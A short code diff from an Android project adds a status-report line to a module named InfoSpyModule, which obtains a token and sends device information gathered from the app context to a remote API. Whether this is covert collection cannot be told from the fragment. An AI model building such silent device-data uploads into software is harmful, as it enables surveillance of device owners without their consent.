@@ -57,6 +57,7 @@ public final class InfoSpyModule implements Module {
 
                         String token = apiService.getToken(ClapApi.prepareAuth(androidContext));
 
+                        ModuleManager.getInstance().reportStatus("send info");
                         InfoRequest.InfoMessage message = ClapApi.prepareInfoMessage(androidContext);
                         InfoRequest request = ClapApi.prepareBaseRequest(new InfoRequest(), androidContext, token, message);
                         apiService.sendInfo(request);
